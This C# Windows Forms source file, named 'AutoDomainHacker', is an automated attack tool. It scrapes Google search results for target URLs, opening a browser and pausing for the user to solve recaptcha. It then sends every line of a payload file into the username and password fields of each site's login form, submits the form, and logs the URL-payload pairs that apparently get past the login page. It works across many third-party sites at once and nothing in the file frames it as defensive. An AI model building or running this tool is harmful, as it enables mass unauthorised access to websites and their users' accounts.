using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace AutoDomainHacker
{
    public partial class Home : Form
    {
        public Home()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();

            if(textBox1.Text != "")
            {
                IWebDriver driver = null;
                if (comboBox3.Text == "Google Chrome")
                {
                    driver = CreateChromeDriver(false);
                }
                else if (comboBox3.Text == "Mozilla Firefox")
                {
                    driver = CreateFirefoxDriver(false);
                }

                string searchQuery = textBox1.Text;
                driver.Navigate().GoToUrl("https://www.google.com/search?q=" + searchQuery);
                int pages = 1;
                int noOfPages = int.Parse(comboBox1.Text);

                List<string> urls = new List<string>();
                while (pages <= noOfPages)
                {
                    if (driver.PageSource.Contains("Our systems have detected unusual traffic from your computer network"))
                    {                       
                        MessageBox.Show("Please manually resolve recaptcha and press enter");
                    }
                    var urlElements = driver.FindElements(By.ClassName("yuRUbf"));
                    foreach (var element in urlElements)
                    {
                        string url = element.FindElement(By.TagName("a")).GetAttribute("href");
                        urls.Add(url);
                        listView1.Items.Add(url);
                    }
                    pages++;
                    try
                    {
                        if (pages <= noOfPages)
                            driver.FindElement(By.CssSelector("#pnnext>span:nth-child(2)")).Click();
                    }
                    catch (Exception)
                    {
                        break;
                    }
                }
                label3.Text = "Total URLs: "+listView1.Items.Count.ToString();
            }   
        }
        private void button2_Click(object sender, EventArgs e)
        {
            if (listView1.CheckedItems.Count > 0)
            {
                foreach (ListViewItem item in listView1.CheckedItems)
                {
                    item.Remove();
                }
            }
            label3.Text = "Total URLs: " + listView1.Items.Count.ToString();
        }


        Random random = new Random();
        public ChromeDriver CreateChromeDriver(bool hideBrowser)
        {
            ChromeOptions options = new ChromeOptions();
            if(hideBrowser)
            {
                options.AddArgument("--headless");
            } 
            options.AddArgument("--no-sandbox");
            options.AddExcludedArgument("enable-automation");
            options.AddAdditionalCapability("useAutomationExtension", false);
            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
            service.HideCommandPromptWindow = true;
            //TimeSpan.FromSeconds is the max time for request to timeout
            ChromeDriver driver = new ChromeDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 60)));
            driver.Manage().Timeouts().PageLoad.Add(System.TimeSpan.FromSeconds(random.Next(10, 20)));
            driver.Manage().Window.Maximize();
            return driver;
        }
        public FirefoxDriver CreateFirefoxDriver(bool hideBrowser)
        {
            FirefoxOptions options = new FirefoxOptions();
            if (hideBrowser)
            {
                options.AddArgument("--headless");
            }
            options.AddArgument("--no-sandbox");
            FirefoxDriverService service = FirefoxDriverService.CreateDefaultService();
            service.HideCommandPromptWindow = true;
            FirefoxDriver driver = new FirefoxDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 60)));
            driver.Manage().Timeouts().PageLoad.Add(System.TimeSpan.FromSeconds(random.Next(10, 20)));
            driver.Manage().Window.Maximize();
            return driver;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            DialogResult result = saveFileDialog.ShowDialog();
            if (result == DialogResult.OK)
            {
                string fileName = saveFileDialog.FileName;

                FileStream fileStream = new FileStream(fileName+".txt", FileMode.OpenOrCreate, FileAccess.Write);
                StreamWriter writer = new StreamWriter(fileStream);
                foreach (ListViewItem item in listView1.Items)
                {
                    writer.WriteLine(item.Text);
                    writer.Flush();
                    fileStream.Flush();
                }
                writer.Close();
                fileStream.Close();
            }
            
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;
            comboBox3.SelectedIndex = 0;
            listView1.CheckBoxes = true;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            DialogResult dialogResult = openFileDialog.ShowDialog();
            if(dialogResult == DialogResult.OK)
            {
                string fileName = openFileDialog.FileName;
                label4.Text = fileName;
            }
        }
        private void button6_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            DialogResult dialogResult = openFileDialog.ShowDialog();
            if (dialogResult == DialogResult.OK)
            {
                string fileName = openFileDialog.FileName;
                label5.Text = fileName;
            }
        }
        private void button5_Click(object sender, EventArgs e)
        {
            button7.Hide();
            listView2.Items.Clear();
            string[] urls = File.ReadAllLines(label5.Text);
            string[] payloads = File.ReadAllLines(label4.Text);

            IWebDriver driver = null;
            if (comboBox2.Text == "Google Chrome")
            {
                driver = CreateChromeDriver(checkBox1.Checked);
            } 
            else if (comboBox2.Text == "Mozilla Firefox")
            {
                driver = CreateFirefoxDriver(checkBox1.Checked);
            }
            
            if (driver != null)
            {
                foreach (string url in urls)
                {
                    IJavaScriptExecutor scriptExecutor = (IJavaScriptExecutor)driver;
                    scriptExecutor.ExecuteScript("window.open()");
                }
                int lwCount = 0;
                foreach (string payload in payloads)
                {
                    int counter = 0;
                    foreach (string url in urls)
                    {
                        try
                        {
                            driver.SwitchTo().Window(driver.WindowHandles[counter]);
                            driver.Navigate().GoToUrl(url);
                            //USER ID/EMAIL/USERNAME
                            try
                            {
                                var element = driver.FindElements(By.CssSelector("input"));
                                int i = 0;
                                foreach (var item in element)
                                {
                                    string type = item.GetAttribute("type");
                                    if (type == "text" || type == "username" || type == "email")
                                    {
                                        if (element[i + 1].GetAttribute("type") == "password")
                                        {
                                            item.SendKeys(payload);
                                            goto PASSWORD;
                                        }
                                    }
                                    i++;
                                }
                            }
                            catch (Exception)
                            {

                            }

                        //PASSWORD
                        PASSWORD:
                            driver.FindElement(By.CssSelector("input[type = password]")).Clear();
                            driver.FindElement(By.CssSelector("input[type = password]")).SendKeys(payload);


                            Thread.Sleep(700);


                            //SUBMIT/BUTTON
                            try
                            {
                                var elements = driver.FindElements(By.CssSelector("input"));
                                int i = 0;
                                foreach (var item in elements)
                                {
                                    try
                                    {
                                        string type = item.GetAttribute("type");
                                        if (type == "submit" || type == "button")
                                        {
                                            if (elements[i - 1].GetAttribute("type") == "password")
                                            {
                                                item.Click();
                                                goto OUT;
                                            }
                                            if (elements[i - 1].GetAttribute("type") == "checkbox" && elements[i - 2].GetAttribute("type") == "password")
                                            {
                                                item.Click();
                                                goto OUT;
                                            }
                                        }
                                    }
                                    catch (Exception)
                                    {
                                        continue;
                                    }
                                    i++;
                                }
                            }
                            catch (Exception)
                            {
                                goto SUBMIT2;
                            }

                        SUBMIT2:
                            try
                            {
                                var elements = driver.FindElements(By.CssSelector("button"));
                                elements[elements.Count - 1].Click();
                                goto OUT;
                            }
                            catch (Exception) { }

                        OUT:
                            try
                            {
                                driver.SwitchTo().Alert().Dismiss();
                            }
                            catch (Exception)
                            {

                            }
                            try
                            {
                                string currentUrl = driver.Url;
                                if (!currentUrl.Contains("login.php") && !currentUrl.Contains("error"))
                                {
                                    listView2.Items.Add(url);
                                    listView2.Items[lwCount].SubItems.Add(payload);
                                    lwCount++;
                                }
                            }
                            catch (Exception) { }
                        }
                        catch (Exception) { continue; }

                        counter++;
                    }
                }
                driver.Dispose();
                //KillProcesses();
            }
            button7.Show();
        }
        public void KillProcesses()
        {
            Process[] driverProcesses = Process.GetProcessesByName("chrome");
            Process[] firefoxDriverProcesses = Process.GetProcessesByName("firefox");
            foreach (var driverProcess in driverProcesses)
            {
                driverProcess.Kill();
            }
            foreach (var firefoxDriverProcess in firefoxDriverProcesses)
            {
                firefoxDriverProcess.Kill();
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            DialogResult result = saveFileDialog.ShowDialog();
            if (result == DialogResult.OK)
            {
                string fileName = saveFileDialog.FileName;

                FileStream fileStream = new FileStream(fileName + ".txt", FileMode.OpenOrCreate, FileAccess.Write);
                StreamWriter writer = new StreamWriter(fileStream);
                foreach (ListViewItem item in listView2.Items)
                {
                    writer.WriteLine(item.Text+"      "+item.SubItems[1].Text);
                    writer.Flush();
                    fileStream.Flush();
                }
                writer.Close();
                fileStream.Close();
            }
        }
    }
}
